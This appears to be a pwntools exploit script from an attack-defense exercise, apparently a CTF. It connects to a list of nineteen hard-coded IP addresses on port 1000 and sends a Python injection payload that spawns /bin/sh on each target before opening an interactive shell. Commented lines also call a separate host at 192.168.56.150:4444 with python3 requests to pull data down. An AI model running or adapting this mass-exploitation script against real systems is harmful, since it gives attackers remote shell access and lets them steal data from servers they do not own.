from pwn import *

ips = ['108.137.78.179',
'108.137.124.12',
'108.137.9.116',
'108.136.138.33',
'108.137.80.77',
'108.136.242.32',
'108.137.89.10',
'108.137.98.237',
'108.136.184.1',
'108.137.153.176',
'108.137.62.86',
'108.137.123.137',
'108.137.55.136',
'108.136.150.147',
'108.137.94.244',
'108.137.80.112',
'108.137.9.155',
'108.137.91.40',
'108.137.70.31']
for ip in ips:
    IP = ip
    PORT = 1000
    def req(ip=IP, port=PORT):
            with remote(ip, port) as r:
                r.sendline("__import__('os').system('/bin/sh')")
                # r.sendline("""python3 -c "import requests; print(requests.get('http://192.168.56.150:4444/}').text)""")
                r.interactive()
    req()
# python3 -c "import requests; print(requests.get('http://192.168.56.150:4444/kode/32gmbiutdKl9Y').text)"
# python3 -c "import requests; print(requests.get('http://192.168.56.150:4444/').text)"